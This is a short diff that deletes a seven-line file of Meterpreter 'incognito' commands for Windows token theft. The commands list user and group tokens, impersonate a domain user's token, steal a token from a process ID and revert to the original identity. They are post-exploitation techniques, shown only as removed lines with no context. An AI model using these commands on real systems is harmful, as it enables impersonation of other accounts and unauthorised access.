@@ -1,7 +1,0 @@
-use incognito
-list_tokens -u
-list_tokens -g
-impersonate_token DOMAIN_NAME\\USERNAME
-steal_token PID
-drop_token
-rev2self
